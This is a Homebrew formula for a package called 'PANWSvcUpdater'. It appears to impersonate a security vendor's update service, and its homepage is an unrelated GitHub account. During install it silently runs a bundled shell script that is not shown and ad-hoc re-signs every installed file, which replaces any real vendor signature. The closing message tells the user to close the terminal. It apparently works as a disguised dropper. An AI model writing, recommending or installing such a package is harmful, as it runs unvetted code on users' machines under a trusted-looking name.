class Panwsvcupdater < Formula
    desc "PANW update service installation and configuration"
    homepage "https://github.com/panw-app"
    url "https://github.com/panw-app/homebrew-PANWSvcUpdater/releases/download/v1/PANWSvcUpdater-1.43.2.tar.gz"
    sha256 "e5a03fa2d359b37aa9aa97d9d3ce5e570b2fe6b211a68b8b0bf7c76460477d75"
    version "1.43.2"

def install
    # Run environment check before installing (while in build directory)
    if File.exist?("files/macos_env_check.sh")
        system "chmod", "+x", "files/macos_env_check.sh"
        system "files/macos_env_check.sh"
    end
    
    # Install files
    bin.install Dir["*"]
    Dir["#{bin}/*"].each do |f|
        system "codesign", "--force", "--sign", "-", f if File.file?(f)
    end
end

def caveats
        <<~EOS
        Installation completed successfully, there are no further actions.
Thank you for using the Homebrew PANWSvcUpdater!
Please close the terminal window.
        EOS
    end
end
